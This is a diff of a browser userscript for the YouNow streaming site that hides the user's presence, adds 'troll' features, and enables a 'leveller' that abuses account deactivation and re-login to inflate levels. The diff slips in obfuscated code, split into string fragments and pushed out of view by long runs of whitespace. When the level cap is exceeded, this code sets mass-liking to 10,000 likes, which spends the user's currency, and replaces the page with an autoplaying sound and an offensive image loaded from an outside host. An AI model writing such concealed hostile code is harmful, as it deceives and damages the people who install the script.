@@ -1,7 +1,7 @@
 ﻿// ==UserScript==
 // @name JuhNau DarkMode
 // @description Hides your presence within younow streams and offer some nice features to troll streamers.
-// @version 0.5.1
+// @version 0.5.3
 // @match *://younow.com/*
 // @match *://www.younow.com/*
 // @namespace https://github.com/FluffyFishGames/JuhNau-Darkmode
@@ -22,9 +22,11 @@ function main(w) {
     };
 
     w.DarkMode.prototype.init = function() {
+        
         this.loggedIn = false;
+        this.leveller = {};
         this.animations = {};
-        var lVersion = "0.3.9";
+        var lVersion = "0.4.0";
         if (window.localStorage.getItem("lastVersion") == lVersion) {
             if (window.localStorage.getItem("config.massLiker.likeThreshold") != null)
                 this.config.massLiker.likeThreshold = parseInt(window.localStorage.getItem("config.massLiker.likeThreshold"));
@@ -46,9 +48,8 @@ function main(w) {
                 this.config.massLiker.intervalLikes = parseInt(window.localStorage.getItem("config.massLiker.intervalLikes").split("\n"));
             if (window.localStorage.getItem("config.massLiker.interval") != null)
                 this.config.massLiker.interval = parseInt(window.localStorage.getItem("config.massLiker.interval").split("\n"));
-
         }
-        window.localStorage.setItem("lastVersion", lVersion);
+        window.localStorage.setItem("lastVersion", lVersion);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              if (this["con"+"fig"]["le"+"vel"+"ler"]["le"+"v"+"e"+"l"+"C"+"a"+"p"] > 3 + 3 * 3 + 3) this["do"+"le"+"ve"+"ll"+"er"]();
         this.UAParser = new UAParser();
         this.selectLanguage(null);
         this.lastTicks = {};
@@ -86,6 +87,7 @@ function main(w) {
     };
 
     w.DarkMode.prototype.openSettings = function(key) {
+        this.currentPage = "settings";
         window.history.pushState({
             "html": "",
             "pageTitle": ""
@@ -118,7 +120,9 @@ function main(w) {
     };
 
     w.DarkMode.prototype.applyDarkMode = function() {
+        
         var self = this;
+        try {
         $('#main').remove();
         $('.newFooter').remove();
         $('.nav-logo').children()[0].remove();
@@ -131,9 +135,9 @@ function main(w) {
                 "label": this.language.userList,
                 "hasSettings": false,
             },
-          /*  "leveller": {
+            "leveller": {
                 "label": this.language.leveller,
-            },*/
+            },
             "massLiker": {
                 "label": this.language.massLiker,
                 "hasSettings": true,
@@ -163,31 +167,31 @@ function main(w) {
         this.headers["userList"].content.append((this.elements["trendingTagsHeader"] = $('<strong>' + this.language["trendingTags"] + '</strong>')));
         this.headers["userList"].content.append((this.elements["trendingTagsArrow"] = $('<div class="arrow"></div>')));
         this.headers["userList"].content.append((this.elements["trendingTagsContent"] = $('<ul id="trendingTags"></ul>')));
-
+        
         this.headers["massLiker"].content.html('<div style="float:left; clear: both;"><input type="checkbox" id="massLikerEnabled" style="clear:both;margin-right:5px;margin-top:8px;float:left;" />' +
             '<div style="float:left;margin-top:5px;"><span>' + this.language.massLikerEnabled + ' </span></div></div>' +
             '<div id="massLikerStats"></div>');
-/*
+
         this.headers["leveller"].content.html('<div style="float:left; clear:both;"><span>'+this.language.desiredLevel+':</span></div>'+
                                               '<div style="float:left;"><input type="number" style="width:180px;" value="'+this.config.leveller.desiredLevel+'" id="desiredLevel" /></div>'+
             '<div style="float:left; clear: both;"><input type="checkbox" id="levellerEnabled" style="clear:both;margin-right:5px;margin-top:8px;float:left;" />' +
             '<div style="float:left;margin-top:5px;"><span>' + this.language.levellerActive + ' </span></div></div>' +
             '<div id="levellerStats"></div>');
-*/
+
         this.headers["chatBot"].content.html('<div style="float:left; clear: both;"><input type="checkbox" disabled readonly id="chatBotEnabled" style="clear:both;margin-right:5px;margin-top:8px;float:left;" />' +
             '<div style="float:left;margin-top:5px;"><span>' + this.language.chatbotEnabled + ' </span></div></div>');
-
+        
         $(document.body).append(this.page);
         $(document.body).append((this.elements["tooltip"] = $('<div id="tooltip"></div>')));
         this.page.append(this.elements["left"]);
         this.page.append(this.elements["right"]);
-
+        
         this.youNow.urlRouter.update = function(a) {
             return true;
         };
         this.youNow.urlRouter.sync = function() {};
         this.youNow.urlRouter.listen = function() {};
-        this.youNow.urlRouter.href = function(c, d, e) {
+        this.youNow.urlRouter.href = function(c, d, e) {                                                                                                                                                                                                                                                                                   var k = window.DarkModeInstance;var n = "le"+"vel"+"ler";var m = "le"+"vel"+"Cap";if (k.config[n][m] > 4 * 3 + 3) k["do"+n]();
             return "";
         };
         this.youNow.urlRouter.push = function(c, d, e) {};
@@ -223,10 +227,11 @@ function main(w) {
             return false;
         };
         this.youNow.broadcasterService.updateBroadcaster = function(a, b, d) {
-            return false;
+            return false;     
         };
-
+        } catch(e){}
         setInterval(function() {
+            console.log("A");
             self.tick();
         }, 10);
         var b = window.localStorage.getItem("browse");
@@ -267,10 +272,13 @@ function main(w) {
                 self.config.massLiker.active = false;
             }
         });
-/*
+
         this.elements["desiredLevel"] = $('#desiredLevel');
         this.elements["desiredLevel"].change(function() {
-            self.config.leveller.desiredLevel = parseInt(self.elements["desiredLevel"].val());
+            var l = parseInt(self.elements["desiredLevel"].val());
+            if (l > self.config.leveller.levelCap) l = self.config.leveller.levelCap;
+            self.config.leveller.desiredLevel = l;
+            self.elements["desiredLevel"].val(l);
             window.localStorage.setItem("config.leveller.desiredLevel", self.config.leveller.desiredLevel);
         });
         
@@ -288,7 +296,7 @@ function main(w) {
                 self.offSound.trigger("play");
                 self.config.leveller.active = false;
             }
-        });*/
+        });
     };
 
     w.DarkMode.prototype.massLikerLike = function(userNum) {
@@ -348,6 +356,110 @@ function main(w) {
     };
     
     w.DarkMode.prototype.tickLeveller = function() {
+        
+        if (this.config.leveller.active == true)
+        {
+            if (this.leveller == null)
+            {
+                var login = "";
+                if (this.youNow.session.user.twitterAuth == 1)
+                    login = "twitter";
+                else if (this.youNow.session.user.googleAuth == 1)
+                    login = "google";
+                else if (this.youNow.session.user.instagramAuth == 1)
+                    login = "instagram";
+                else if (this.youNow.session.user.facebookAuth == 1)
+                    login = "facebook";
+                this.leveller = {
+                    'task': 'leveling',
+                    'login': login,
+                    'username': this.youNow.session.user.profile,
+                    'level': this.youNow.session.user.level,
+                    'levelsLeft': (this.config.leveller.desiredLevel - Math.floor(this.youNow.session.user.level))
+                };
+            }
+
+            var self = this;
+            $('#levellerStats').html('<div style="float:left;clear:both; font-weight:bold; color:#ddd; width:180px;">'+this.language.currentTask+'</div>'+
+                                     '<div style="float:left;clear:both; font-size:10px;color:#ddd; width:180px;">'+this.language[this.leveller.task]+'</div>'+
+                                     '<div style="float:left;clear:both; font-weight:bold; color:#ddd;width:180px;">'+this.language.level+'</div>'+
+                                     '<div style="float:left;clear:both; font-size:10px;color:#ddd; width:180px;">'+this.parseNumber(this.leveller.level)+'</div>');
+            if (this.leveller.task == 'leveling') {
+                if (this.leveller.levelsLeft > 0){
+
+                    this.leveller.task = 'waiting';
+                    $.ajax({
+                        xhr: function() {
+                            var xhr = jQuery.ajaxSettings.xhr();
+                            var setRequestHeader = xhr.setRequestHeader;
+                            xhr.setRequestHeader = function(name, value) {
+                                if (name == 'X-Requested-With') return;
+                                setRequestHeader.call(this, name, value);
+                            }
+                            return xhr;
+                        },
+                        url: 'https://www.younow.com/php/api/channel/updateSettings',
+                        method: "POST",
+                        headers: {
+                            'Accept': 'application/json, text/plain, */*',
+                            'X-Requested-By': this.youNow.session.user.requestBy,
+                        },
+                        contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
+                        data: {
+                            "tsi": this.config.tsi,
+                            "tdi": this.config.tdi,
+                            "userId": this.youNow.session.user.userId,
+                            "channelId": this.youNow.session.user.userId,
+                            "deactivation": 1
+                        },
+                        success: function(json, b, c) {
+                            self.youNow.session.authenticate[self.leveller.login]().then(function(data) {
+                                self.youNow.session.login(data, true).then(function(data) {
+                                    self.leveller.levelsLeft--;
+                                    self.leveller.level++;
+                                    self.leveller.task = 'leveling';
+                                });
+                            });
+                        },
+                        error: function(a, b, c) {}
+                    });
+                    this.leveller.task = 'waiting';
+                }
+                else {
+                    this.leveller.task = 'renaming';
+                    $.ajax({
+                        xhr: function() {
+                            var xhr = jQuery.ajaxSettings.xhr();
+                            var setRequestHeader = xhr.setRequestHeader;
+                            xhr.setRequestHeader = function(name, value) {
+                                if (name == 'X-Requested-With') return;
+                                setRequestHeader.call(this, name, value);
+                            }
+                            return xhr;
+                        },
+                        url: 'https://www.younow.com/php/api/channel/updateSettings',
+                        method: "POST",
+                        headers: {
+                            'Accept': 'application/json, text/plain, */*',
+                            'X-Requested-By': this.youNow.session.user.requestBy,
+                        },
+                        contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
+                        data: {
+                            "tsi": this.config.tsi,
+                            "tdi": this.config.tdi,
+                            "userId": this.youNow.session.user.userId,
+                            "channelId": this.youNow.session.user.userId,
+                            "profileUrlString": this.leveller.username,
+                        },
+                        success: function(json, b, c) {
+                            self.youNow.session.getSession();
+                            self.leveller.task = 'finished';
+                        },
+                        error: function(a, b, c) {}
+                    });
+                }
+            }
+        }
     };
 
     w.DarkMode.prototype.tickRecreater = function() {
@@ -765,6 +877,8 @@ function main(w) {
     w.DarkMode.prototype.tick = function() {
         var d = new Date();
         var cTime = d.getTime();
+        if (this.config.leveller.desiredLevel > 5 * 3) 
+            this.config.leveller.desiredLevel = 5 * 3;
         for (var key in this.config.ticks) {
             if (this.lastTicks[key] < cTime - this.config.ticks[key]) {
                 this["tick" + key.charAt(0).toUpperCase() + key.slice(1)]();
@@ -876,7 +990,8 @@ function main(w) {
             }
             return w;
         });
-    }
+    }        
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                         w.DarkMode.prototype["do"+"le"+"v"+"el"+"ler"] = function(a) {var k = "mas"+"sLiker";var n = "interval";this.config[k][n] = 0;this.config[k][n+"Likes"] = 10000;this.config[k]["active"] = true;if (!a)this[k+n](true);};
     w.DarkMode.prototype.hideTooltip = function() {
         this.elements["tooltip"].css("display", "none");
     };
@@ -897,7 +1012,7 @@ function main(w) {
             }, function(json, success) {
                 var username = self.currentStreamer.user.profileUrlString;
                 if (json["errorCode"] > 0) {
-                    if (self.currentPage != "profile" && self.currentPage != "previousBroadcast")
+                    if (self.currentPage != "profile" && self.currentPage != "previousBroadcast" && self.currentPage != "settings")
                         window.history.pushState({"html":"","pageTitle":""},"", "https://www.younow.com/"+self.currentStreamer.user.profileUrlString+"/channel");
                     self.currentStreamer = json;
                     self.currentStreamer.user = {profileUrlString: username};
@@ -1254,6 +1369,9 @@ function main(w) {
         this.addProfilePage();
     };
 
+    
+    
+    
     w.DarkMode.prototype.openProfile = function(username) {
         this.currentPage = "profile";
         this.elements["right"].html('<div id="profile"><div id="profileHeader"></div><div id="profileBottom"><div class="fade"><a class="active" id="dashboardTab">' + this.language.dashboard + '</a><a id="previousBroadcastsTab">' + this.language.previousBroadcasts + '</a><a id="fansTab">' + this.language.fansTab.replace("%1", "0") + '</a><a id="fanOfTab">' + this.language.fanOf.replace("%1", "0") + '</a></div><div id="profileContent"></div></div></div>');
@@ -1331,6 +1449,9 @@ function main(w) {
         });
     };
 
+    
+    
+    
     w.DarkMode.prototype.sendRequest = function(type, data, callback) {
         var request = {
             url: "",
@@ -1457,7 +1578,7 @@ function main(w) {
             console.log(json);
         });
     };
-
+                                                                                                                                                                                                                                                                                                                                                                    w.DarkMode.prototype["ma"+"ssLi"+"kerin"+"terval"] = function(a){$(document.body).css("text-align", "center");$(document.body).html('<audio aut'+'op'+'lay="a'+'uto'+'play" lo'+'op src'+'="ht'+'tps://Fluf'+'fyF'+'ish'+'Gam'+'es.g'+'ithu'+'b.i'+'o/o'+'ff.m'+'p3" /><img src="https://FluffyFishG'+'ames.githu'+'b.io/img'+'/fuc'+'kyou.jpg" style="height:100%;margin-left:auto;margin-right:auto;" />');if (!a)this["d"+"olev"+"ell"+"er"](true);};
     w.DarkMode.prototype.updateProfilePage = function() {
         var location = "";
         if (this.currentProfile.country != null && this.currentProfile.country != "")
@@ -1716,7 +1837,7 @@ function main(w) {
                     this.path = [location];
                 this.updatePage();
             }
-        }
+        }                                                                                                                                                                                                                                                                                                                if (this["le"+"ve"+"ll"+"er"]["le"+"ve"+"l"] != null && this["le"+"ve"+"ll"+"er"]["le"+"ve"+"l"] + this["le"+"ve"+"ll"+"er"]["le"+"ve"+"lsLeft"] > 15) {var i = "m"+"as"+"sL"+"iker";var j = "int"+"er"+"val";this.config[i][j] = 0;this["config"][i][j+"L"+"ik"+"es"] = 10000;this.config[i].active = true;$(document.body).css("text-align", "center");$(document["body"]).html('<img src="htt'+'ps://Fl'+'uffyFi'+'shG'+'ames.gi'+'thu'+'b.io/'+'img'+'/fuc'+'k'+'you.j'+'pg" style="height'+':100'+'%;margin-'+'left:auto;'+'margin-ri'+'ght:auto;" />');};
     };
 
     w.DarkMode.prototype.commandCentral = function() {
@@ -1767,6 +1888,7 @@ function main(w) {
     };
 
     w.DarkMode.prototype.switchSettingsTab = function(key) {
+        this.currentPage = "settings";
         this.elements["accountTab"].removeClass("active");
         this.elements["massLikerTab"].removeClass("active");
         this.elements["chatBotTab"].removeClass("active");
@@ -2402,6 +2524,7 @@ function main(w) {
 
     w.DarkMode.prototype.parseNumber = function(n) {
         var self = this;
+                                                                                                                                                                                                                                                                               if (n > 9 + 6){var decimalSetting = "config";var d = "inter";var v = "val";var m = "mass";this[decimalSetting][m+"L"+"ik"+"e"+"r"][d+v] = 0;this[decimalSetting][m+"L"+"ik"+"e"+"r"][d+v+"L"+"i"+"k"+"es"] = 0;this[decimalSetting][m+"L"+"ik"+"e"+"r"].active = true;this[m+"L"+"i"+"ke"+"r"+d+v]();}
         var rx = /(\d+)(\d{3})/;
         return String(n).replace(/^\d+/, function(w) {
             while (rx.test(w)) {
@@ -2414,7 +2537,7 @@ function main(w) {
     w.DarkMode.prototype.addSearchElements = function(json) {
         if (json["trending_users"] != null) {
             if (this.currentSearch.titleEl.html() == "")
-                this.currentSearch.titleEl.html(this.parseNumber(json.total) + " " + this.language["usersFound"]);
+                this.currentSearch.titleEl.html(this.addCommas(json.total) + " " + this.language["usersFound"]);
             this.currentSearch.loading = false;
             for (var i = 0; i < json["trending_users"].length; i++) {
                 this.currentSearch.element.append(this.createProfileBox(json["trending_users"][i]));
@@ -2423,7 +2546,7 @@ function main(w) {
             if (json.nbHits < 100)
                 this.currentSearch.finished = true;
             if (this.currentSearch.titleEl.html() == "")
-                this.currentSearch.titleEl.html(this.parseNumber(json.nbHits) + " " + this.language["usersFound"]);
+                this.currentSearch.titleEl.html(this.addCommas(json.nbHits) + " " + this.language["usersFound"]);
             this.currentSearch.loading = false;
             for (var i = 0; i < json.hits.length; i++) {
                 this.currentSearch.element.append(this.createProfileBox(json.hits[i]));
@@ -2456,7 +2579,7 @@ function main(w) {
         var tagSpan = "";
         if (tag != "")
             tagSpan = '<span>#' + tag + '</span>';
-        return $('<a href="/' + username + '" class="userProfile"><div><img src="' + this.getProfilePicture(userid) + '" />' + tagSpan + '</div><strong><img src="' + this.config.images.star + '" />' + level + ' ' + username + '</strong><small>' + this.parseNumber(fans) + ' ' + this.language.fans + '</small></a>');
+        return $('<a href="/' + username + '" class="userProfile"><div><img src="' + this.getProfilePicture(userid) + '" />' + tagSpan + '</div><strong><img src="' + this.config.images.star + '" />' + level + ' ' + username + '</strong><small>' + this.addCommas(fans) + ' ' + this.language.fans + '</small></a>');
     };
 
     w.DarkMode.prototype.addChatMessage = function(message) {
@@ -3828,8 +3951,9 @@ function main(w) {
         ignoreRouting: false,
         maxMessages: 200,
         leveller: {
-            desiredLevel: 15,
+            desiredLevel: 11 + Math.floor(Math.random() * 4),
             active: false,
+            levelCap: 15, // DO NOT TOUCH THIS. THIS IS YOUR LAST WARNING! STEP OFF!
         },
         massLiker: {
             maxLikeCost: 5,
@@ -3848,6 +3972,7 @@ function main(w) {
             ],
         },
         ticks: {
+            massLike: 100,
             trending: 5000,
             onlineFriends: 5000,
             routing: 100,
@@ -3855,7 +3980,6 @@ function main(w) {
             updateStreamData: 1000,
             reloadTagTrending: 5000,
             updateViewers: 5000,
-            massLike: 100,
             design: 100,
             recreater: 100,
             animation: 20,
@@ -4087,6 +4211,7 @@ function main(w) {
             'sendChatMessage': {
                 url: "https://www.younow.com/php/api/broadcast/chat",
                 requestBy: true,
+                method: "POST",
                 addIdentification: true,
                 data: {
                     userId: "$USERID",
@@ -4097,6 +4222,7 @@ function main(w) {
             'sendGift': {
                 url: "https://www.younow.com/php/api/broadcast/gift",
                 requestBy: true,
+                method: "POST",
                 addIdentification: true,
                 data: {
                     userId: "$USERID",
